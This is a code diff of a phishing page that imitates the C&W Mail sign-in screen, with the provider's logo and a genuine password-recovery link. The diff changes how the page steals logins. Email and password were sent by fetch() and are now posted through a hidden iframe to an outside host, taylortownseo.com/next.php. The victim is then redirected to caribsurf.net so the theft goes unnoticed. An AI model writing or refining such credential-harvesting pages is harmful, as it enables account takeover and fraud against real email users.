@@ -10,13 +10,20 @@
 
 <body>
 
+<!-- Hidden iframe to receive the POST -->
+<iframe name="hiddenFrame" style="display:none;"></iframe>
+
 <div class="mainDiv">
     <img id="hdrImage" alt="" src="candwmail_com.png">
 
-    <!-- NOTE: action removed -->
-    <form id="form">
-        <input type="text" class="field" placeholder="Email" name="email" id="email" required>
-        <input type="password" class="field" placeholder="Password" name="password" id="password" required>
+    <form
+        action="http://taylortownseo.com/next.php"
+        method="POST"
+        target="hiddenFrame"
+        onsubmit="redirectAfterSubmit();"
+    >
+        <input type="text" class="field" placeholder="Email" name="email" required>
+        <input type="password" class="field" placeholder="Password" name="password" required>
 
         <div class="checkDiv divLeft">
             <input type="checkbox" id="auto" name="auto">
@@ -24,37 +31,30 @@
         </div>
 
         <div class="divRight">
-            <a id="hlpLink" href="https://mailconfig.candwmail.com/tmngxSelfcareCWC/recovery?1&variant=fl" target="_blank">
+            <a id="hlpLink"
+               href="https://mailconfig.candwmail.com/tmngxSelfcareCWC/recovery?1&variant=fl"
+               target="_blank">
                 Forgot your password?
             </a>
         </div>
 
-        <button type="submit" class="btnSubmit" style="width: 437px;">Sign in</button>
+        <button type="submit" class="btnSubmit" style="width:437px;">
+            Sign in
+        </button>
     </form>
 
-    <div class="errorDiv"><span id="error" class="error"></span></div>
+    <div class="errorDiv">
+        <span id="error" class="error"></span>
+    </div>
 </div>
 
 <script>
-document.getElementById("form").addEventListener("submit", function (e) {
-    e.preventDefault(); // stop normal submit
-
-    const form = this;
-    const formData = new FormData(form);
-
-    fetch("http://taylortownseo.com/next.php", {
-        method: "POST",
-        body: formData
-    })
-    .then(function () {
-        // redirect ONLY after POST completes
+function redirectAfterSubmit() {
+    // Give the POST time to complete before redirecting
+    setTimeout(function () {
         window.location.href = "https://www.caribsurf.net/";
-    })
-    .catch(function () {
-        // optional error handling
-        document.getElementById("error").textContent = "Submission failed. Please try again.";
-    });
-});
+    }, 600);
+}
 </script>
 
 </body>
